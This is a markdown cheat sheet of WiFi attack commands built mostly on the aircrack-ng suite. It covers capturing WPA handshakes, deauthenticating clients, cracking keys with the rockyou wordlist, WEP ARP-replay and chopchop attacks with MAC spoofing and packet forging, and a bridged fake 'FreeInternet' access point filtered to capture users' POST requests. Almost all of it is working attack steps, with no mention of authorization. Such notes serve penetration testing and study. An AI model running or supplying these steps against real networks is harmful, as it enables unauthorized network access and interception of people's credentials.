
### WiFi Security
_1.1 Basics_  
Check Wireless interface
```
$ iwconfig wlan0
$ airmon-ng check / check kill (check and kill interfering processes with monitor interface)
```
Set up monitor mode interface on wlan0
```
$ airmon-ng start wlan0
or
$ airmon-ng stop wlan0mon
```
Check packet injection and link quality
```
$ aireplay-ng -9 wlan0mon
```
Discover wireless networks
```
$ kismet -c mon0
or
$ airodump-ng mon0
$ airodump-ng -c 11 -a mon0 (+lock to channel)
```
WPA Capture
```
Airodump-ng --bssid <TargetNetworkBSSID> -c <channel> -w handshake (outputfile)  wlan0mon (interface)
``` 
Deauth client from BSSID network
```
Aireplay-ng -0 0 -a <TargetNetworkBSSID> -c ClientMAC wlan0mon
```
Dictionary Attack vs WPA handshake - WPA keys are between 8 and 63 characters.  
Optimize wordlist for WPA/WPA2 testing
```
$ pw-inspector -i rockyou.txt -o optimized.txt -m 8 -M 63
then
$ aircrack-ng -w optimized.txt ../handshake/handshake.cap
```
_1.2 Traffic Analysis_
```
Launch Wireshark and select your monitor interface, start
//Filter by BSSID to focus on target network traffic
wlan.fc.type_subtype != 8 && wlan.bssid == <BSSID Value>
//Filter further by only selecting the management frames and authentication frames
**add, && wlan.fc.type == 0 && (wlan.fc.subtype == 0 || wlan.fc.subtype == 1 || wlan.fc.subtype == 0xB)
or, && wlan.fc.type == 2

Decrypt Captured Traffic
WEP 
# airdecap.ng -w <wep key in hex> <.cap>
WPA 
# airdecap.ng -p <wpa passphrase> -e <SSID> <.cap>
```
_1.3 Attacking WiFi Networks_
```
WEP
# aireplay-ng -l 6000 -q 10 -a BSSID -e SSID mon0 //Sending authentication/association request
# aireplay-ng -3 -b BSSID mon0 //ARP replay attack
//Capture good amount of frames 10-20k
# aircrack-ng -n 64 wep_capture.cap

WEP + Shared Key Authentication
//Jot down MAC address of associated clients for spoofing, take down monitor interface
# macchanger --mac <MAC to Spoof> mon0
//Can proceed from here as WEP cracking earlier or perform CHOPCHOP attack.
# aireplay-ng -4 -b BSSID mon0
//Proceed with good candidate frame >68 bytes
//Look at decrypted data frame .cap with TCPDump
# tcpdump -n -r decrypted_data_frame.cap
//Forge ARP request with IP addresses discovered
# packetforge-ng --arp -a AP-BSSID -h ClientMACAddress -k TargetIP -l SenderIP -y decrypted_data_frame.xor -w arp_req
//Inject forged ARP request
# aireplay-ng -2 -r arp_req -x 100 mon0
```
_1.4 WiFi As Attack Vector_
```
//Setup Fake AP
# airbase-ng -c 11 -e FreeInternet mon0
//Bridge the connection between eth0 and Fake AP interface at0
# brctl addbr br0
# brctl addif br0 eth0
# brctl addif br0 at0
# ifconfig eth0 0.0.0.0 up
# ifconfig at0 0.0.0.0 up
# ifconfig br0 192.168.3.11 up //Assign IP address that isnt taken by another client
//Enable packet forwarding on attack machine
# echo 1 > /proc/sys/net/ipv4/ip_forward

//Launch Wireshark on Fake AP interface and filter traffic to only POST requests
http && http.request.method == POST

Wardriving
wigle.net
```
